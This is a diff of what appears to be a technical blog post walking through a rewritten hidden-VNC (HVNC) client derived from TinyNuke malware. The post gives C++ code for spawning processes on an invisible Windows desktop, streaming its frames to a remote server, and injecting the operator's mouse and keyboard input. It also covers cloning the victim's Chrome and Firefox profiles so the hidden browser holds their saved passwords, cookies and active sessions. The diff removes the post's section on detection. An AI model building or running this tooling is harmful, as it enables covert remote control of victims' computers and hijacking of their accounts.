@@ -8,7 +8,7 @@ export const metadata = {
 
 I rewrote [TinyNuke's](https://github.com/rossja/TinyNuke) HVNC module as a standalone client-server and figured I'd write up some notes on how it works, broadly.
 
-Windows supports multiple desktop objects per session, and the visible desktop is just one of them. You can create another that runs in parallel, invisible to the user.
+Windows supports multiple desktop objects per session, and the visible desktop is just one of them. You can create another desktop, switch a thread to it, and start processes there. Those processes still create normal windows and receive normal window messages, but they are attached to a desktop the user is not viewing:
 
 ```cpp
 HDESK hDesk = CreateDesktopA("HiddenDesktop", NULL, NULL, 0, GENERIC_ALL, NULL);
@@ -17,24 +17,24 @@ SetThreadDesktop(hDesk);
 STARTUPINFO si = {0};
 si.cb = sizeof(si);
 si.lpDesktop = "HiddenDesktop";
-CreateProcess("C:\\Windows\\explorer.exe", NULL, NULL, NULL, 
+CreateProcess("C:\\Windows\\explorer.exe", NULL, NULL, NULL,
               FALSE, 0, NULL, NULL, &si, &pi);
 ```
 
-Once you call `SetThreadDesktop(){:cpp}`, everything you spawn goes to that desktop. The `lpDesktop` field in `STARTUPINFO` controls which desktop a process starts in.
+`SetThreadDesktop(){:cpp}` attaches the current thread to `HiddenDesktop`. Setting `STARTUPINFO.lpDesktop` makes the new explorer process start there too.
 
 ## Architecture
 
-Two threads do everything:
+The client work is split across two threads:
 
-- **Desktop Thread**: Captures frames from the hidden desktop and streams them to the server
-- **Input Thread**: Receives mouse/keyboard events from the server and posts them to windows on the hidden desktop
+- **Desktop thread:** Captures frames from the hidden desktop and streams them to the server
+- **Input thread:** Receives mouse/keyboard events from the server and posts them to windows on the hidden desktop
 
-Both connect to the same server socket. Handshake is 7 bytes `MELTED\0` followed by 4-byte connection type (0 for desktop thread, 1 for input thread).
+Both threads connect back to the same server port, but as separate TCP connections. During the handshake, each connection sends `MELTED\0` plus a 4-byte type value (`0` for desktop frames or `1` for input). The server returns a session ID on the input connection, and the desktop connection sends that ID when it connects, which gives the server enough information to pair the two streams.
 
 ## Screen Capture
 
-Using `BitBlt(){:cpp}` on the desktop DC only gets what's currently visible on top, so minimized or obscured windows don't show up. Better to enumerate windows individually:
+`BitBlt(){:cpp}` from the desktop DC captures the desktop as Windows has drawn it, with windows layered on top of each other. The client avoids relying on that single image by walking the window stack and rendering each visible window into the frame:
 
 ```cpp
 HWND hWnd = GetTopWindow(NULL);
@@ -43,91 +43,104 @@ hWnd = GetWindow(hWnd, GW_HWNDLAST);
 while (hWnd != NULL) {
     if (IsWindowVisible(hWnd)) {
         GetWindowRect(hWnd, &rect);
-        PrintWindow(hWnd, hDcWindow, 0);
-BitBlt(hDcScreen, rect.left, rect.top, 
+        PrintWindow(hWnd, hDcWindow, PW_RENDERFULLCONTENT);
+        BitBlt(hDcScreen, rect.left, rect.top,
                rect.right - rect.left, rect.bottom - rect.top,
                hDcWindow, 0, 0, SRCCOPY);
-}
+    }
     hWnd = GetWindow(hWnd, GW_HWNDPREV);
 }
 ```
 
-Start from the bottom window with `GW_HWNDLAST`, walk upward with `GW_HWNDPREV`. `PrintWindow(){:cpp}` captures each window's content even if it's minimized or behind other windows.
+The loop starts at the bottom of the window stack with `GW_HWNDLAST` and moves upward with `GW_HWNDPREV`, matching the way windows are layered on the desktop. For each visible window, `PrintWindow(){:cpp}` renders the window into a temporary DC using `PW_RENDERFULLCONTENT`, then `BitBlt(){:cpp}` copies that image into the frame at the window's screen coordinates.
 
-To avoid sending identical frames, compare each pixel to the previous capture:
+Before sending a frame, the client compares the new capture with the previous one. Unchanged pixels are written as RGB(255, 174, 201), which serves as a marker value for "copy this pixel from the previous frame." Because that color can also appear in the capture itself, the client adjusts matching pixels before building the diff:
 
 ```cpp
+const BYTE marker[3] = {255, 174, 201};
+
 for (DWORD i = 0; i < imageSize; i += 3) {
-    if (pixels[i] == oldPixels[i] && 
-        pixels[i+1] == oldPixels[i+1] && 
-        pixels[i+2] == oldPixels[i+2]) {
-        pixels[i] = 255;
-pixels[i+1] = 174;
-        pixels[i+2] = 201;
+    if (memcmp(pixels + i, marker, sizeof(marker)) == 0) {
+        ++pixels[i + 1];
     }
+}
+memcpy(tempPixels, pixels, imageSize);
+
+bool changed = false;
+for (DWORD i = 0; i < imageSize; i += 3) {
+    if (memcmp(pixels + i, oldPixels + i, 3) == 0) {
+        memcpy(pixels + i, marker, sizeof(marker));
+    } else {
+        changed = true;
+    }
+}
+
+if (changed) {
+    memcpy(oldPixels, tempPixels, imageSize);
 }
 ```
 
-Unchanged pixels get marked as RGB(255, 174, 201) so the server skips them. If every pixel matches, send 0 and skip transmission entirely. Compress with `RtlCompressBuffer(){:cpp}` using LZNT1 before sending.
+On decode, each marker pixel is filled from the server's previous frame. If the comparison found no changes at all, the client sends `0` instead of an image body. When a frame does contain changes, it is still raw pixel data, so the client compresses it with `RtlCompressBuffer(){:cpp}` using LZNT1 and then sends it.
 
 ## Input Routing
 
-Events arrive as (msg, wParam, lParam) tuples. For mouse events, need to find which window and control the coordinates actually point to:
+The server sends input as `msg`, `wParam`, and `lParam`, matching the pieces of a Win32 message. For mouse events, the client has to resolve the screen coordinate to the window or child control under the cursor:
 
 ```cpp
-POINT point;
-point.x = GET_X_LPARAM(lParam);
-point.y = GET_Y_LPARAM(lParam);
+POINT screenPoint = {
+    GET_X_LPARAM(lParam),
+    GET_Y_LPARAM(lParam)
+};
 
-HWND hWnd = WindowFromPoint(point);
-ScreenToClient(hWnd, &point);
+HWND hWnd = WindowFromPoint(screenPoint);
+POINT clientPoint;
 
-HWND child = ChildWindowFromPoint(hWnd, point);
-while (child != NULL && child != hWnd) {
+for (;;) {
+    clientPoint = screenPoint;
+    ScreenToClient(hWnd, &clientPoint);
+
+    HWND child = ChildWindowFromPoint(hWnd, clientPoint);
+    if (child == NULL || child == hWnd) {
+        break;
+    }
     hWnd = child;
-    ScreenToClient(hWnd, &point);
-child = ChildWindowFromPoint(hWnd, point);
 }
 
-lParam = MAKELPARAM(point.x, point.y);
+lParam = MAKELPARAM(clientPoint.x, clientPoint.y);
 PostMessageA(hWnd, msg, wParam, lParam);
 ```
 
-`WindowFromPoint(){:cpp}` gives you the top-level window. Convert to client coordinates with `ScreenToClient(){:cpp}`, then walk the child hierarchy with `ChildWindowFromPoint(){:cpp}` until you hit the actual control.
+Since child lookup uses coordinates relative to the window being checked, the code keeps `screenPoint` unchanged as it walks down the child window tree, derives a fresh `clientPoint` at each level, and rebuilds `lParam` for the window that will receive the message.
 
-For window dragging, check `WM_NCHITTEST` to see if the mouse is on the title bar or window edge. Then call `MoveWindow(){:cpp}` directly with adjusted coordinates:
+Dragging and resizing still use the normal input path, with `WM_NCHITTEST` returning the window frame area under the cursor. During a title bar drag, the client updates the window position with `MoveWindow(){:cpp}`:
 
 ```cpp
 LRESULT hitTest = SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
 if (hitTest == HTCAPTION) {
     int moveX = lastPoint.x - currentPoint.x;
-int moveY = lastPoint.y - currentPoint.y;
+    int moveY = lastPoint.y - currentPoint.y;
     MoveWindow(hWnd, x - moveX, y - moveY, width, height, FALSE);
 }
 ```
 
 ## Browser Profile Cloning
 
-Before launching a browser on the hidden desktop, you clone the user's profile to get their saved passwords and active sessions.
+Before launching a browser on the hidden desktop, the client copies the user's profile data into a new directory. The hidden browser instance then starts with the same saved passwords, cookies, and active sessions instead of a rather *useless* empty profile.
 
-**Chrome**: Copy `%LOCALAPPDATA%\Google\Chrome\User Data\Default` to a new directory
+**Chrome:** Copy `%LOCALAPPDATA%\Google\Chrome\User Data\` to a new directory
 
-**Firefox**: Parse `%APPDATA%\Mozilla\Firefox\profiles.ini` to find the profile path, then copy that directory
+**Firefox:** Parse `%APPDATA%\Mozilla\Firefox\profiles.ini` to find the active profile directory, then copy it
 
-Launch the browser pointing to the cloned profile:
+The client then launches the browser on `HiddenDesktop` with the copied profile path:
 
 ```cpp
 char cmd[MAX_PATH];
 sprintf(cmd, "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" "
-             "--user-data-dir=\"%s\"", clonedProfilePath);
+             "--user-data-dir=\"%s\"", clonedUserDataPath);
 STARTUPINFO si = {0};
 si.cb = sizeof(si);
 si.lpDesktop = "HiddenDesktop";
 CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 ```
 
-## Detection
-
-Most standard tools are scoped to the visible desktop, including Task Manager, which won't show the desktop assignment at all. Process Explorer's Environment tab or Sysinternals Desktops.exe can surface it. More telling signs are multiple explorer.exe instances, browsers with unusual user data paths, or simultaneous connections to the same IP. Most EDR agents don't track desktop assignments at the thread level, so this tends to go unnoticed.
-
-Source code at: [github.com/Meltedd/HVNC](https://github.com/Meltedd/HVNC)
+For more details, the source: [github.com/Meltedd/HVNC](https://github.com/Meltedd/HVNC)
